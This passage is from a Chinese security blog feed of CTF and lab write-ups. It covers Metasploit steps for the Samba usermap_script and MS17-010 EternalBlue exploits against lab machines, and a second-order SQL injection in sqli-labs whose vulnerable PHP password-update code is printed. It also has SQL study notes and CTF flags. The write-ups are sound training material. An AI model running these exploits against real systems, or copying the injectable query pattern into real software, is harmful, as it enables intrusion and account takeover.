-3.0.25rc3</a>]</th></tr></thead></table><h2 id="samba-漏洞利用"><a href="#samba-漏洞利用" class="headerlink" title="samba 漏洞利用"></a>samba 漏洞利用</h2><blockquote><p>msf 集成了 samba的漏洞</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0  exploit/multi/samba/usermap_script         2007-05-14       excellent  No     Samba &quot;username map script&quot; Command Execution  </span><br></pre></td></tr></table></figure><blockquote><p>设置好直接开始用就可 直接就拿到 shell了<br>直接在makdis下查看user.txt<br>和root下查看</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hackthebox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数学基础信安总结-一次遗忘的作业</title>
      <link href="/2024/04/25/%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"/>
      <url>/2024/04/25/%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h3 id="咱们今天基于这几个简单问题复习一下一些数学基础"><a href="#咱们今天基于这几个简单问题复习一下一些数学基础" class="headerlink" title="咱们今天基于这几个简单问题复习一下一些数学基础"></a>咱们今天基于这几个简单问题复习一下一些数学基础</h3><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240425211419.png" alt="image.png"></p><h3 id="欧拉函数计算"><a href="#欧拉函数计算" class="headerlink" title="欧拉函数计算"></a>欧拉函数计算</h3><blockquote><p>欧拉函数φ(n)是小于或等于_n_的正整数中与_n_互质的数的数目<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240425174333.png" alt="image.png"></p></blockquote><blockquote><p>如果n是质数 那么我们可以知道欧拉函数  n-1<br>非质数   先分解因数分解成各种 质数的乘积 之后再 按照公式</p></blockquote><h3 id="费马小定理"><a href="#费马小定理" class="headerlink" title="费马小定理"></a>费马小定理</h3><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240425195039.png"></p><p>直接解决问题 …… SO  easy!!!</p><h3 id="扩展的欧几里得算法"><a href="#扩展的欧几里得算法" class="headerlink" title="扩展的欧几里得算法"></a>扩展的欧几里得算法</h3><blockquote><p>上图了具体我也不会解释<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/b7571be9eeeedde2bd20044abfe82c1.jpg" alt="b7571be9eeeedde2bd20044abfe82c1.jpg"></p></blockquote><h3 id="中国剩余定理"><a href="#中国剩余定理" class="headerlink" title="中国剩余定理"></a>中国剩余定理</h3><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240425203131.png" alt="image.png"></p><h2 id="模重复平方法"><a href="#模重复平方法" class="headerlink" title="模重复平方法"></a>模重复平方法</h2><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/dd982407efcf6dcf60bcd75896eb64f.jpg" alt="dd982407efcf6dcf60bcd75896eb64f.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全数学基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全数学基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf-misc-掌控腾龙杯</title>
      <link href="/2024/03/30/ctf-misc-%E6%8E%8C%E6%8E%A7%E8%85%BE%E9%BE%99%E6%9D%AF%E5%88%B7%E9%A2%98/"/>
      <url>/2024/03/30/ctf-misc-%E6%8E%8C%E6%8E%A7%E8%85%BE%E9%BE%99%E6%9D%AF%E5%88%B7%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="简简单单一张图片（签到题）"><a href="#简简单单一张图片（签到题）" class="headerlink" title="简简单单一张图片（签到题）"></a>简简单单一张图片（签到题）</h1><blockquote><p>在stegsolve中把msb中的rgb三个颜色拉满就会出现</p><p>一串字符</p></blockquote><p><img src="https://img2.imgtp.com/2024/03/28/cB0lrjpx.png"></p><blockquote><p>rot13解密</p><p>flag{pour_in_hot_rapeseed_oil_and_pour_soul_juice}</p></blockquote><h1 id="嘘-听，什么声音？"><a href="#嘘-听，什么声音？" class="headerlink" title="嘘~听，什么声音？"></a>嘘~听，什么声音？</h1><p><img src="https://img2.imgtp.com/2024/03/28/fNzgbmd6.png"></p><blockquote><p>获得了九键直接用九键解密即可 </p><p>把数字分为两个一组   第一个数字作为按键第二个数字作为按键的字母上的第几个字母</p><p>[81 63 31 21 93] [42 21 71 71 93] [74 81 82 31 93] [31 81 61 33]</p><p>flag{TODAYHAPPYSTUDYDTMF}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql_学习_day1</title>
      <link href="/2024/03/30/sql-%E5%AD%A6%E4%B9%A0-day1/"/>
      <url>/2024/03/30/sql-%E5%AD%A6%E4%B9%A0-day1/</url>
      
        <content type="html"><![CDATA[<h1 id="0X01创建表"><a href="#0X01创建表" class="headerlink" title="0X01创建表"></a>0X01创建表</h1><h2 id="0x02列级约束"><a href="#0x02列级约束" class="headerlink" title="0x02列级约束"></a>0x02列级约束</h2><blockquote><p>NOT NULL 约束: 确保列中的值不为空。<br>UNIQUE 约束: 确保列中的值是唯一的，不允许重复。<br>PRIMARY KEY 约束: 将列定义为主键，保证列中的值唯一且非空。<br>FOREIGN KEY 约束: 定义列的外键关系，确保列中的值在另一个表中存在。<br>CHECK 约束: 根据指定条件检查列中的值是否有效。</p></blockquote><br/><h3 id="0x03注意点"><a href="#0x03注意点" class="headerlink" title="0x03注意点"></a>0x03注意点</h3><blockquote><p>两种方式设置主码和外码</p><ol><li>第一种:</li></ol><blockquote><p>列名 数据结构  primary key</p></blockquote><ol start="2"><li>第二种<blockquote><p>直接在最下面一行加上 primary key(名字，名字,…….) </p><p>FOREIGN key(外码) references 被参照表(被参照表列名)</p></blockquote></li></ol></blockquote><h2 id="0x04数据结构"><a href="#0x04数据结构" class="headerlink" title="0x04数据结构"></a>0x04数据结构</h2><blockquote><p>创建表怎么能少了数据结构</p><p>整数型：</p><p>INT 或 INTEGER：整数值（通常为 32 位）。<br>SMALLINT：较小范围的整数值。<br>BIGINT：较大范围的整数值。<br>小数型：</p><p>DECIMAL 或 NUMERIC：带有精度和小数位数的小数值。<br>FLOAT 或 REAL：浮点数值。<br>DOUBLE 或 DOUBLE PRECISION：双精度浮点数值。<br>字符型：</p><p>CHAR(n)：固定长度的字符串，最大长度为 n。<br>VARCHAR(n)：可变长度的字符串，最大长度为 n。<br>TEXT：长文本字符串。<br>日期&#x2F;时间型：</p><p>DATE：日期值。<br>TIME：时间值。<br>DATETIME 或 TIMESTAMP：日期和时间值。<br>INTERVAL：时间间隔值。<br>布尔型：</p><p>BOOLEAN 或 BOOL：布尔值（真或假）。<br>二进制型：</p><p>BINARY：固定长度的二进制数据。<br>VARBINARY：可变长度的二进制数据。<br>BLOB：大型二进制对象。<br>其他常见类型：</p><p>ENUM：枚举类型，只允许列表中的一个值。<br>SET：集合类型，允许多个值的组合。</p></blockquote><br/><h2 id="1x01完事具备只欠东风"><a href="#1x01完事具备只欠东风" class="headerlink" title="1x01完事具备只欠东风"></a>1x01完事具备只欠东风</h2><blockquote><p>给一个创建表的模板</p><p>CREATE TABLE table_name (<br>column1_name data_type constraints,<br>column2_name data_type constraints,<br>…<br>columnN_name data_type constraints<br>);</p></blockquote><h2 id="1x02-例子"><a href="#1x02-例子" class="headerlink" title="1x02 例子"></a>1x02 例子</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">creat <span class="keyword">table</span> S(</span><br><span class="line">      SNO <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">primary key</span>,</span><br><span class="line">      SNAME <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">UNIQUE</span>,</span><br><span class="line">      status <span class="type">int</span> ,</span><br><span class="line">      City <span class="type">VARCHAR</span>(<span class="number">50</span>) );</span><br><span class="line">  </span><br><span class="line">creat <span class="keyword">table</span> P(</span><br><span class="line">    PNO <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">primary key</span>,</span><br><span class="line">    PNAME <span class="type">varchar</span>(<span class="number">50</span>) ,</span><br><span class="line">    color <span class="type">VARchar</span>(<span class="number">50</span>) ,</span><br><span class="line">    weight <span class="type">varchar</span>(<span class="number">50</span>));</span><br><span class="line">creat <span class="keyword">table</span> J(</span><br><span class="line">    JNO <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">primary key</span>,</span><br><span class="line">    JNAME <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">NOT NULL</span>,</span><br><span class="line">    city <span class="type">varchar</span>(<span class="number">50</span>));</span><br><span class="line"></span><br><span class="line">creat <span class="keyword">table</span>  SPJ(</span><br><span class="line">    SNO <span class="type">varchar</span>(<span class="number">50</span>),</span><br><span class="line">    PNO <span class="type">varchar</span>(<span class="number">50</span>),</span><br><span class="line">    JNO <span class="type">varchar</span>(<span class="number">50</span>),</span><br><span class="line">    QTY <span class="type">INT</span>，</span><br><span class="line">    <span class="keyword">primary key</span>(SNO,PNO,JNO),</span><br><span class="line">    <span class="keyword">foreign key</span>(SNO) <span class="keyword">references</span> S(SNO), </span><br><span class="line">    <span class="keyword">foreign key</span>(PNO) <span class="keyword">references</span> P(PNO),</span><br><span class="line">    <span class="keyword">foreign key</span>(JNO) <span class="keyword">references</span> J(JNO));</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">  <span class="operator">*</span><span class="operator">*</span>插入数据:<span class="operator">*</span><span class="operator">*</span></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">insert into</span> S <span class="keyword">values</span>(<span class="string">&#x27;S1&#x27;</span>,<span class="string">&#x27;精益&#x27;</span>,<span class="string">&#x27;20&#x27;</span>,<span class="string">&#x27;天津&#x27;</span>),</span><br><span class="line">                    (<span class="string">&#x27;S2&#x27;</span>,<span class="string">&#x27;盛锡&#x27;</span>,<span class="string">&#x27;10&#x27;</span>,<span class="string">&#x27;北京&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;S3&#x27;</span>,<span class="string">&#x27;东方红&#x27;</span>,<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;北京&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;S4&#x27;</span>,<span class="string">&#x27;丰泰盛&#x27;</span>,<span class="string">&#x27;20&#x27;</span>,<span class="string">&#x27;天津&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;S5&#x27;</span>,<span class="string">&#x27;为民&#x27;</span>,<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;上海&#x27;</span>);</span><br><span class="line"><span class="keyword">insert into</span> P <span class="keyword">values</span>(<span class="string">&#x27;P1&#x27;</span>,<span class="string">&#x27;螺母&#x27;</span>,<span class="string">&#x27;红&#x27;</span>,<span class="string">&#x27;12&#x27;</span>),</span><br><span class="line">                    (<span class="string">&#x27;P2&#x27;</span>,<span class="string">&#x27;螺栓&#x27;</span>,<span class="string">&#x27;绿&#x27;</span>,<span class="string">&#x27;17&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;P3&#x27;</span>,<span class="string">&#x27;螺丝刀&#x27;</span>,<span class="string">&#x27;蓝&#x27;</span>,<span class="string">&#x27;14&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;P4&#x27;</span>,<span class="string">&#x27;螺丝刀&#x27;</span>,<span class="string">&#x27;红&#x27;</span>,<span class="string">&#x27;14&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;P5&#x27;</span>,<span class="string">&#x27;凸轮&#x27;</span>,<span class="string">&#x27;蓝&#x27;</span>,<span class="string">&#x27;40&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;P6&#x27;</span>,<span class="string">&#x27;齿轮&#x27;</span>,<span class="string">&#x27;红&#x27;</span>,<span class="string">&#x27;30&#x27;</span>);</span><br><span class="line"><span class="keyword">insert into</span> J <span class="keyword">values</span>(<span class="string">&#x27;J1&#x27;</span>,<span class="string">&#x27;三建&#x27;</span>,<span class="string">&#x27;北京&#x27;</span>),</span><br><span class="line">                    (<span class="string">&#x27;J2&#x27;</span>,<span class="string">&#x27;一汽&#x27;</span>,<span class="string">&#x27;长春&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;J3&#x27;</span>,<span class="string">&#x27;弹簧厂&#x27;</span>,<span class="string">&#x27;天津&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;J4&#x27;</span>,<span class="string">&#x27;造船厂&#x27;</span>,<span class="string">&#x27;天津&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;J5&#x27;</span>,<span class="string">&#x27;机车厂&#x27;</span>,<span class="string">&#x27;天津&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;J6&#x27;</span>,<span class="string">&#x27;无线电厂&#x27;</span>,<span class="string">&#x27;常州&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;J7&#x27;</span>,<span class="string">&#x27;半导体厂&#x27;</span>,<span class="string">&#x27;南京&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert into</span> SPJ <span class="keyword">values</span>(<span class="string">&#x27;s1&#x27;</span>,<span class="string">&#x27;p1&#x27;</span>,<span class="string">&#x27;j1&#x27;</span>,<span class="string">&#x27;200&#x27;</span>),(<span class="string">&#x27;s1&#x27;</span>,<span class="string">&#x27;p1&#x27;</span>,<span class="string">&#x27;j3&#x27;</span>,<span class="string">&#x27;100&#x27;</span>),(<span class="string">&#x27;s1&#x27;</span>,<span class="string">&#x27;p1&#x27;</span>,<span class="string">&#x27;j4&#x27;</span>,<span class="string">&#x27;700&#x27;</span>),(<span class="string">&#x27;s1&#x27;</span>,<span class="string">&#x27;p2&#x27;</span>,<span class="string">&#x27;j2&#x27;</span>,<span class="string">&#x27;100&#x27;</span>),(<span class="string">&#x27;s2&#x27;</span>,<span class="string">&#x27;p3&#x27;</span>,<span class="string">&#x27;j1 &#x27;</span>,<span class="string">&#x27;400&#x27;</span>),(<span class="string">&#x27;s2&#x27;</span>,<span class="string">&#x27;p3&#x27;</span>,<span class="string">&#x27;j2&#x27;</span>,<span class="string">&#x27;200&#x27;</span>),(<span class="string">&#x27;s2&#x27;</span>,<span class="string">&#x27;p3&#x27;</span>,<span class="string">&#x27;j4&#x27;</span>,<span class="string">&#x27;500&#x27;</span>),(<span class="string">&#x27;s2&#x27;</span>,<span class="string">&#x27;p3&#x27;</span>,<span class="string">&#x27;j5&#x27;</span>,<span class="string">&#x27;400&#x27;</span>),(<span class="string">&#x27;s2&#x27;</span>,<span class="string">&#x27;p5&#x27;</span>,<span class="string">&#x27;j1&#x27;</span>,<span class="string">&#x27;400&#x27;</span>),(<span class="string">&#x27;s2&#x27;</span>,<span class="string">&#x27;p5&#x27;</span>,<span class="string">&#x27;j2&#x27;</span>,<span class="string">&#x27;100&#x27;</span>),(<span class="string">&#x27;s3&#x27;</span>,<span class="string">&#x27;p1&#x27;</span>,<span class="string">&#x27;j1 &#x27;</span>,<span class="string">&#x27;200&#x27;</span>),(<span class="string">&#x27;s3&#x27;</span>,<span class="string">&#x27;p3&#x27;</span>,<span class="string">&#x27;j1&#x27;</span>,<span class="string">&#x27;200&#x27;</span>),(<span class="string">&#x27;s4&#x27;</span>,<span class="string">&#x27;p5&#x27;</span>,<span class="string">&#x27;j1 &#x27;</span>,<span class="string">&#x27;100&#x27;</span>),(<span class="string">&#x27;s4&#x27;</span>,<span class="string">&#x27;p6&#x27;</span>,<span class="string">&#x27;j3&#x27;</span>,<span class="string">&#x27;300&#x27;</span>),(<span class="string">&#x27;s4&#x27;</span>,<span class="string">&#x27;p6&#x27;</span>,<span class="string">&#x27;j4&#x27;</span>,<span class="string">&#x27;200&#x27;</span>),(<span class="string">&#x27;s5&#x27;</span>,<span class="string">&#x27;p2&#x27;</span>,<span class="string">&#x27;j4&#x27;</span>,<span class="string">&#x27;100&#x27;</span>),(<span class="string">&#x27;s5&#x27;</span>,<span class="string">&#x27;p3&#x27;</span>,<span class="string">&#x27;j1&#x27;</span>,<span class="string">&#x27;200&#x27;</span>),(<span class="string">&#x27;s5&#x27;</span>,<span class="string">&#x27;p6&#x27;</span>,<span class="string">&#x27;j2&#x27;</span>,<span class="string">&#x27;200&#x27;</span>),(<span class="string">&#x27;s5&#x27;</span>,<span class="string">&#x27;p6&#x27;</span>,<span class="string">&#x27;j4 &#x27;</span>,<span class="string">&#x27;500&#x27;</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据库SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF长城杯</title>
      <link href="/2024/03/19/%E4%B9%B1%E5%88%B7%E9%95%BF%E5%9F%8E%E6%9D%AF/"/>
      <url>/2024/03/19/%E4%B9%B1%E5%88%B7%E9%95%BF%E5%9F%8E%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<p><img src="https://img2.imgtp.com/2024/03/09/RHPXj7nO.png"></p><h1 id="阅读须知："><a href="#阅读须知：" class="headerlink" title="阅读须知："></a>阅读须知：</h1><blockquote><p>探索者安全团队技术文章仅供参考,未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作,由于传播、利用本公众号所提供的技术和信息而造成的任何直接或者间接的后果及损失，均由使用者<br>本人负责，作者不为此承担任何责任,如有侵权烦请告知，我们会立即删除并致歉,创作不易转载请标明出处.感谢!</p></blockquote><h1 id="办公室爱情"><a href="#办公室爱情" class="headerlink" title="办公室爱情"></a>办公室爱情</h1><blockquote><p>hint：办公室里出现了爱情关系，作为旁观者，我们知道了沃德喜欢皮迪符，沃德对他的爱分为外在和内在两部分。皮迪符心里只包含了皮皮特，但是我们不知道皮皮特的内心，请你一起来看看皮皮特的心里有谁。<br>请将题目答案中的flag替换为NSSCTF</p></blockquote><h2 id="word"><a href="#word" class="headerlink" title="word"></a>word</h2><blockquote><ol><li><p>直接转zip 压缩包搜索提示 直接grep  搜索全部解压后的文件看看有没有什么提示grep -irE “flag|pass|pwd|password” –binary-files&#x3D;without-match *</p><h3 id="提示"><a href="#提示" class="headerlink" title="提示:"></a>提示:</h3><ol><li><p>password1:True_lOve_</p></li><li><p>password12:i2_supReMe</p><p>拼接:</p><blockquote><p>True_lOve_i2_supReMe</p></blockquote></li></ol></li></ol></blockquote><h2 id="PDF"><a href="#PDF" class="headerlink" title="PDF"></a>PDF</h2><blockquote><p>pdf直接看看wbStego4open 隐写</p><p>利用word的密码 进行解密</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; True_lOve_i2_supReMe</span><br></pre></td></tr></table></figure></blockquote></blockquote><blockquote><p>得到this_is_pAssw0rd@!</p></blockquote><h1 id="PPT"><a href="#PPT" class="headerlink" title="PPT"></a>PPT</h1><blockquote><p>ppt给出的一定是ppt的解密 基本就不用去看什么伪加密</p><p>打开ppt</p><p>一眼彩虹七进制加密</p><blockquote><p>难度不大直接就是红橙黄绿青蓝紫的顺序对应0-6<br>但是 白色对应 _ 直接就是七进制转十进制再转ascii码</p></blockquote></blockquote><h1 id="基于瑞克摇的计算机网络流量分析"><a href="#基于瑞克摇的计算机网络流量分析" class="headerlink" title="基于瑞克摇的计算机网络流量分析"></a>基于瑞克摇的计算机网络流量分析</h1><blockquote><h2 id="首先拿到流量分析的题目"><a href="#首先拿到流量分析的题目" class="headerlink" title="首先拿到流量分析的题目"></a>首先拿到流量分析的题目</h2><p>hint:假设你是李华，你的英国朋友瑞克向你发来了一个流量包。请你根据下列要点分析该流量。<br>要点: 1. 两手握拳 2. 拇指外露，不要被其他四指覆盖 3. 放于腰部 4. 双拳轻柔地左右摇摆</p><p>注意: 1. BV1GJ411x7h7 2. BV1uT4y1P7CX 3. dQw4w9WgXcQ</p></blockquote><blockquote><p>初次看 其实感觉首先开始就是一些tcp的流量 之后获取图标  </p><p> 但是之后就越来越相似 基本都是get请求 </p><p>直接http 过滤一下看到</p><blockquote><p>Never Gonna Give You Up 搜了一下 直接有发现</p></blockquote><p>这是来自Rick Astley的一首歌曲 “Never Gonna Give You Up” 的歌名，常被称为“Rickrolling”（瑞克滚动），指在互联网上恶作剧地以伪装链接的方式将人们带到这首歌的音乐视频中。这首歌曲在1987年首次发布，并在2007年因互联网文化而重新流行起来。</p><p>恶作剧 看来这就是一个恶作剧的翻版</p><p>目前没什么好思路 我是一个一个流跟踪的然后解码 </p></blockquote><hr><h3 id="同时感兴趣的小伙伴可以多多关注我们团队哦"><a href="#同时感兴趣的小伙伴可以多多关注我们团队哦" class="headerlink" title="同时感兴趣的小伙伴可以多多关注我们团队哦!!!"></a>同时感兴趣的小伙伴可以多多关注我们团队哦!!!</h3><p><img src="https://img2.imgtp.com/2024/03/19/PBDIBHDV.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Blue靶场实践</title>
      <link href="/2024/03/19/blue/"/>
      <url>/2024/03/19/blue/</url>
      
        <content type="html"><![CDATA[<p><img src="https://img2.imgtp.com/2024/03/09/RHPXj7nO.png"></p><h1 id="阅读须知："><a href="#阅读须知：" class="headerlink" title="阅读须知："></a>阅读须知：</h1><blockquote><p>探索者安全团队技术文章仅供参考,未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作,由于传播、利用本公众号所提供的技术和信息而造成的任何直接或者间接的后果及损失，均由使用者<br>本人负责，作者不为此承担任何责任,如有侵权烦请告知，我们会立即删除并致歉,创作不易转载请标明出处.感谢!</p></blockquote><p>师傅: K1t0    <a href="https://k1t0111.github.io/">https://k1t0111.github.io</a></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><blockquote><p>今天来打一打简单靶场 ……</p></blockquote><blockquote><p>循例 对机器进行扫描  鉴于很简单 直接快点带过</p><p>直接扫描tcp </p></blockquote><p><img src="https://img2.imgtp.com/2024/03/28/zbuJyuVT.png"></p><blockquote><p>开放 445 和 135 139 端口 直接一看 445 就可能使永恒之蓝    并且给出很可能就是win7 -win10</p><p>不说别的 最好的 直接上 msf 直接先看一遍 是不是永恒之蓝</p></blockquote><h1 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h1><blockquote><p>话不多说  msfconsole </p><p>直接搜一下 search ms17-010 看到出现四个模块 路径 </p><p>直接用 use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue </p><p>设置一下 set rhost 10.10.225.254</p><p>废话不多说直接上图</p></blockquote><br/><p><img src="https://img2.imgtp.com/2024/03/28/iw2Pw8Hy.png"></p><blockquote><p> 先check 看看究竟是不是这个漏洞 </p><p>结果正确易受攻击 </p><p>直接run 开打获取meterpreter</p></blockquote><p><img src="https://img2.imgtp.com/2024/03/28/fbOim5wd.png"></p><blockquote><p>successful  !!!</p><p>PS: 其实这个靶场中还涉及了 可以将shell 转化成 meterpreter</p><p>shell_to_meterpreter</p><p>同时可以用ps 命令查看进程 可以将我们的meterpreter移交到另一个进程中通过migrate</p></blockquote><h1 id="post"><a href="#post" class="headerlink" title="post"></a>post</h1><blockquote><p>其实已经打完了 </p><p><img src="https://img2.imgtp.com/2024/03/29/tXZZJQVC.png"></p></blockquote><blockquote><p>已经是system 没什么好说的 直接在根目录找到 flag1.txt<br>其他的flag 分别在 用户等常规地方找吧…..</p></blockquote><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote><p>基础……….</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tryhackme </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs靶场-二次注入</title>
      <link href="/2024/03/19/sqli-labs%E9%9D%B6%E5%9C%BA-24-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E5%B0%8F%E5%BA%94%E7%94%A8/"/>
      <url>/2024/03/19/sqli-labs%E9%9D%B6%E5%9C%BA-24-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E5%B0%8F%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>@[TOC]</p><blockquote><p>又是一次靶场练习,今天为各位小伙伴带来一次sql注入中二次注入的一次训练!</p></blockquote><p><em><strong>二次注入</strong></em></p><blockquote><p>  开始之前需要 大家了解什么是二次注入，简单来说就是用户输入的数据会经过转义，但是即使转义,最终存在于数据库中的依旧还是用户输入的原始数据，第二次对数据进行处理时候直接从数据库中取出原始数据，数据中一般带有单引号和＃号,然后下次使用在拼凑SQL中，所以就形成了二次注入。</p></blockquote><h1 id="sqli-24靶场分析"><a href="#sqli-24靶场分析" class="headerlink" title="sqli-24靶场分析"></a><em>sqli-24靶场分析</em></h1><p><img src="https://img2.imgtp.com/2024/01/25/Vn2ggbMB.bmp"></p><blockquote><p>首先分析一下,一看这种登录框 有注册页面 还有修改密码页面<br>可能也会想到二次注入。但是二次注入毕竟还是不会这么简单就被发现的所以一般都是在代码审计中发现这样的注入漏洞.</p></blockquote><h2 id="二次注入的几个要点"><a href="#二次注入的几个要点" class="headerlink" title="二次注入的几个要点"></a>二次注入的几个要点</h2><blockquote><ul><li>知道存在用户的一个用户名</li><li>第一次注册时候 数据经过转义</li><li>二次修改直接从数据库中提取,不进行转义</li></ul></blockquote><h1 id="查看源代码"><a href="#查看源代码" class="headerlink" title="查看源代码"></a>查看源代码</h1><blockquote><p>假设我们此时已经知道了admin 这个用户 此时我们如何创建一个用户并且最后能够通过二次注入 将其密码修改成我们所需要的? </p></blockquote><h2 id="修改密码的源代码"><a href="#修改密码的源代码" class="headerlink" title="修改密码的源代码"></a>修改密码的源代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Validating the user input........</span></span><br><span class="line"><span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$curr_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line"><span class="variable">$pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$pass</span>==<span class="variable">$re_pass</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_affected_rows</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Password successfully updated&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span 